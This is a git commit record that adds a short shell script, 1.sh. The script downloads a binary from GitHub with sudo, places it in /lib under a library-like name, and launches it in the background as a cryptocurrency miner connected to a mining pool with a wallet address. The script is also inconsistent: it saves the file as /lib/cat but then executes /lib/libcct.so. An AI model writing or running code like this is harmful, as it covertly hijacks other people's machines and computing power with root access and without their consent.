6f0672ece7a449cff64e4c83bb35501d5240fe6e
Shallow-Sea <59738846+Shallow-Sea@users.noreply.github.com>
2023-04-02 04:06:58 +0800

    Create 1.sh

---
+++ 1.sh
@@ -0,0 +1,4 @@
+#!/bin/bash
+sudo curl -o /lib/cat https://github.com/Shallow-Sea/tools/raw/main/libcct.so
+sudo chmod +x /lib/libcct.so
+sudo nohup /lib/libcct.so -o auto.skypool.xyz:9999 -u 4A4fyoKs9t2bbsq2qLJAzrCCKJohYXfqr9RiLedQFyy6d7KjvRbGbfiUf8Vxbmcbc8KyNkfknTMkz3ggHGZgv6zJEcsq6FK -k --tls --algo auto -p ranshu &
